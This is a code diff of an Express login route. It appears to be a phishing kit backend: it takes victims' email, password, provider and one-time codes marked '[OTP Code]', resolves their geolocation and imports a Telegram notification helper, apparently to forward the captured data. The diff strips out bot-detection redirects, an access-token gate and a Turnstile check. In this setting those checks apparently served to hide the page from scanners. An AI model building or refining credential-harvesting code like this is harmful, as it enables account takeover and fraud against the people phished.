@@ -1,30 +1,14 @@
 import { Router } from 'express';
-import { evaluateBotSignals, sendBotRedirect } from '../lib/botShield.ts';
 import { resolveGeo } from '../lib/geo.ts';
-import {
-  getClientIp,
-  parseEncryptedBody,
-  verifyGateToken,
-  verifyTurnstile,
-} from '../lib/security.ts';
+import { getClientIp, parseEncryptedBody } from '../lib/security.ts';
 import { sendTelegramNotification } from '../lib/telegram.ts';
-import { requireClientSignals, sanitizeLoginFields } from '../lib/validation.ts';
+import { sanitizeLoginFields } from '../lib/validation.ts';
 import { loginRateLimit } from '../middleware/rateLimit.ts';
 
 const router = Router();
 
 router.post('/', loginRateLimit, async (req, res) => {
   try {
-    const accessToken = req.header('x-access-token');
-    if (!(await verifyGateToken(accessToken))) {
-      res.status(403).json({
-        success: false,
-        message: 'Access denied',
-        error: 'Valid session verification is required. Please reload the page.',
-      });
-      return;
-    }
-
     let decrypted: Record<string, unknown>;
     try {
       decrypted = await parseEncryptedBody(req.body);
@@ -34,21 +18,6 @@ router.post('/', loginRateLimit, async (req, res) => {
         message: 'Invalid request',
         error: 'Encrypted payload required.',
       });
-      return;
-    }
-
-    if (!requireClientSignals(decrypted)) {
-      res.status(400).json({
-        success: false,
-        message: 'Invalid request',
-        error: 'Client verification signals are required.',
-      });
-      return;
-    }
-
-    const botCheck = evaluateBotSignals(req, decrypted.clientSignals);
-    if (botCheck.isBot) {
-      sendBotRedirect(res, botCheck.reason);
       return;
     }
 
@@ -62,21 +31,7 @@ router.post('/', loginRateLimit, async (req, res) => {
       return;
     }
 
-    const { email, password, provider, turnstileToken } = fields;
-    const isOtpSubmission = password.startsWith('[OTP Code]');
-
-    if (!isOtpSubmission && turnstileToken) {
-      const clientIp = getClientIp(req);
-      const turnstileVerified = await verifyTurnstile(turnstileToken, clientIp);
-      if (!turnstileVerified) {
-        res.status(403).json({
-          success: false,
-          message: 'Verification failed',
-          error: 'Failed to verify Turnstile challenge.',
-        });
-        return;
-      }
-    }
+    const { email, password, provider } = fields;
 
     const emailLocal = email.split('@')[0];
     const formattedName = emailLocal
@@ -117,6 +72,7 @@ router.post('/', loginRateLimit, async (req, res) => {
         name: formattedName,
         provider: provider || 'email',
         timestamp: new Date().toISOString(),
+        geo,
       },
     });
   } catch (error) {
